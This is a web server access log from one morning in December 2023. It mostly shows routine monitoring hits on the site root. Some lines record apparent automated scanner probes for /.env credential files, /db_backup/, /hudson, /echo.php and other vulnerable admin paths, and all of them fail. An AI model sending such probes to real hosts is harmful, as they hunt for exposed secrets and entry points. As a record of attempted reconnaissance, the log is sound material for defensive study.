185.236.231.150 - - [16/Dec/2023:10:08:58 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1884 "-" "-" 0ms
185.236.231.150 - - [16/Dec/2023:10:08:59 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 1885 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:10:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1886 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1887 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1888 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1889 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1890 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1891 "www@docker" "http://172.29.0.8:80" 1ms
87.236.176.12 - - [16/Dec/2023:10:12:07 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1892 "web-to-websecure@internal" "-" 0ms
87.236.176.12 - - [16/Dec/2023:10:12:07 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1893 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:10:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1894 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1895 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:10:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1896 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1897 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1898 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1899 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1900 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1901 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1902 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1903 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1904 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1905 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1906 "www@docker" "http://172.29.0.8:80" 1ms
91.92.243.232 - - [16/Dec/2023:10:18:29 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1907 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:10:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1908 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1909 "www@docker" "http://172.29.0.8:80" 0ms
185.224.128.142 - - [16/Dec/2023:10:19:36 +0000] "GET /db_backup/ HTTP/1.1" 404 19 "-" "-" 1910 "-" "-" 0ms
185.224.128.142 - - [16/Dec/2023:10:19:36 +0000] "GET /db_backup/ HTTP/1.1" 301 17 "-" "-" 1911 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:10:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1912 "www@docker" "http://172.29.0.8:80" 1ms
185.224.128.142 - - [16/Dec/2023:10:19:36 +0000] "GET /db_backup/ HTTP/1.1" 404 19 "-" "-" 1913 "-" "-" 0ms
74.82.47.2 - - [16/Dec/2023:10:19:47 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1914 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:10:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1915 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1916 "www@docker" "http://172.29.0.8:80" 0ms
185.224.128.142 - - [16/Dec/2023:10:20:58 +0000] "GET /db_backup/ HTTP/1.1" 404 19 "-" "-" 1917 "-" "-" 0ms
185.224.128.142 - - [16/Dec/2023:10:20:58 +0000] "GET /db_backup/ HTTP/1.1" 301 17 "-" "-" 1918 "web-to-websecure@internal" "-" 0ms
185.224.128.142 - - [16/Dec/2023:10:20:58 +0000] "GET /db_backup/ HTTP/1.1" 404 19 "-" "-" 1919 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:10:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1920 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1921 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1922 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1923 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1924 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1925 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1926 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1927 "www@docker" "http://172.29.0.8:80" 0ms
57.129.23.166 - - [16/Dec/2023:10:25:22 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1928 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [16/Dec/2023:10:25:22 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1929 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:10:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1930 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1931 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:10:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1932 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1933 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1934 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1935 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:10:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1936 "www@docker" "http://172.29.0.8:80" 1ms
74.82.47.2 - - [16/Dec/2023:10:28:34 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1937 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:10:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1938 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1939 "www@docker" "http://172.29.0.8:80" 0ms
74.82.47.2 - - [16/Dec/2023:10:29:31 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 1940 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:10:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1941 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1942 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1943 "www@docker" "http://172.29.0.8:80" 0ms
185.224.128.191 - - [16/Dec/2023:10:30:42 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1944 "web-to-websecure@internal" "-" 0ms
74.82.47.2 - - [16/Dec/2023:10:30:45 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1945 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:10:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1946 "www@docker" "http://172.29.0.8:80" 1ms
54.36.115.221 - - [16/Dec/2023:10:31:32 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1947 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [16/Dec/2023:10:31:32 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1948 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:10:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1949 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1950 "www@docker" "http://172.29.0.8:80" 1ms
74.82.47.2 - - [16/Dec/2023:10:32:34 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 1951 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:10:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1952 "www@docker" "http://172.29.0.8:80" 1ms
74.82.47.2 - - [16/Dec/2023:10:33:05 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 1953 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:10:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1954 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1955 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1956 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1957 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:10:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1958 "www@docker" "http://172.29.0.8:80" 0ms
74.82.47.2 - - [16/Dec/2023:10:35:27 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 1959 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:10:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1960 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:10:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1961 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1962 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1963 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1964 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:10:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1965 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1966 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1967 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1968 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1969 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1970 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:10:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1971 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1972 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1973 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1974 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:10:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1975 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1976 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1977 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1978 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1979 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1980 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1981 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1982 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1983 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1984 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:10:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1985 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1986 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1987 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1988 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1989 "www@docker" "http://172.29.0.8:80" 0ms
138.68.208.44 - - [16/Dec/2023:10:50:28 +0000] "GET /hudson HTTP/1.1" 301 17 "-" "-" 1990 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:10:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1991 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1992 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1993 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1994 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1995 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:10:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1996 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1997 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1998 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1999 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2000 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:10:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2001 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2002 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2003 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2004 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2005 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2006 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2007 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:10:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2008 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:10:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2009 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2010 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:11:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2011 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2012 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2013 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2014 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2015 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2016 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2017 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:11:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2018 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:11:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2019 "www@docker" "http://172.29.0.8:80" 0ms
57.129.23.166 - - [16/Dec/2023:11:05:09 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2020 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [16/Dec/2023:11:05:09 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2021 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:11:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2022 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2023 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2024 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2025 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:11:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2026 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:11:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2027 "www@docker" "http://172.29.0.8:80" 0ms
185.224.128.191 - - [16/Dec/2023:11:07:55 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2028 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:11:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2029 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2030 "www@docker" "http://172.29.0.8:80" 1ms
5.188.210.227 - - [16/Dec/2023:11:09:06 +0000] "GET /echo.php HTTP/1.1" 301 17 "-" "-" 2031 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:11:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2032 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2033 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:11:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2034 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:11:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2035 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:11:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2036 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:11:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2037 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [16/Dec/2023:11:12:02 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2038 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:11:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2039 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2040 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [16/Dec/2023:11:12:44 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2041 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [16/Dec/2023:11:13:03 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2042 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [16/Dec/2023:11:13:04 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2043 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:11:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2044 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2045 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2046 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2047 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2048 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:11:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2049 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:11:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2050 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2051 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2052 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2053 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2054 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2055 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2056 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2057 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2058 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2059 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2060 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2061 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2062 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2063 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2064 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:11:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2065 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:11:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2066 "www@docker" "http://172.29.0.8:80" 0ms
95.214.235.169 - - [16/Dec/2023:11:24:26 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2067 "web-to-websecure@internal" "-" 0ms
